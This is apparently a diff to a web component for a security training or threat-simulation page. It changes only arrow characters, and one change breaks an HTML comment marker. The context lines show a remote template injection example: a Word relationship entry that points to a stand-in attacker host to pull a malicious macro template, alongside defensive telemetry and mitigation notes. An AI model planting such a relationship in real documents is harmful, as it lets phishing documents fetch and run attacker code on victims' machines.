@@ -111,7 +111,7 @@ const Topic3 = () => {
         "Static email gateway scanners see zero binary signatures or macros, allowing the weaponized document to land in the user's inbox.",
       telemetryIndicator: "Microsoft Word (`winword.exe`) making outbound HTTP connections to unknown external IPs",
       resilientDefense: "Windows Defender Attack Surface Reduction (ASR) rules blocking Office child processes.",
-      codeSnippet: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) -->
+      codeSnippet: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) ──→
 <Relationship Id="rId1" 
   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
   Target="https://attacker-c2.net/malicious_template.dotm" 
@@ -186,7 +186,7 @@ if (is_ip_in_kolkata_enterprise_range($client_ip)) {
       ? (rawExploitProb * 0.015).toFixed(2) // VIP Armor + FIDO2 + Out-of-Band blocks 98.5% of attacks
       : armorStrength >= 50
       ? (rawExploitProb * 0.35).toFixed(2)  // Standard EDR blocks 65% of attacks
-      : rawExploitProb.toFixed(2);           // No armor -> 100% compromise rate
+      : rawExploitProb.toFixed(2);           // No armor → 100% compromise rate
 
     return {
       rawExploitProb: rawExploitProb.toFixed(2),
